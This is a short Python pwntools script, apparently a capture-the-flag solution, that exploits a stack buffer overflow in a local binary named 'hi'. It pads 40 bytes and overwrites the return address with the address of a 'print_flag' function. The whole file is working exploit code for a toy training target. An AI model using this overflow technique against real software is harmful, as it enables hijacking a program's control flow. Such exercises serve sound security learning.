from pwn import *

elf = ELF('./hi')

# target_address = elf.symbols['print_flag']

# print ('target address:\t', hex(target_address))

garbage = b'a'* (32+8)
indirizzo = p64(elf.symbols['print_flag'])
messaggio = garbage + indirizzo
p = process('./hi')
p.sendline(messaggio)
p.interactive()